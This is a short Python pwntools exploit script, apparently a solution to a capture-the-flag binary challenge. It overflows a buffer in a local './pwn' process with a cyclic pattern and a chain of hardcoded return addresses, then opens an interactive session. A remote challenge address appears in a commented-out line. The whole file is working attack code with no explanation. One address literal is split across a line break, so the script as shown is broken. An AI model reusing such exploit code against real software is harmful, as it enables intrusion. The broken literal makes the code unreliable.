from pwn import *
context.log_level='debug'

# io = remote('111.200.241.244', 61959)
io = process('./pwn')
io.recv()
io.send(b'hello\n')
io.recv()
io.send(cyclic(0x20) + p32(0x8048604) + p32(0x8048618) + p32(0x804862c) + p32(0x8048640) + p32(0x8048654) + p32(0x8048668) + p32(0x80486cc) + p32(0x80486cc) + p32(0x80486cc) + p32(0x80486b
cc))
io.send(b'3@a.vc')
io.interactive()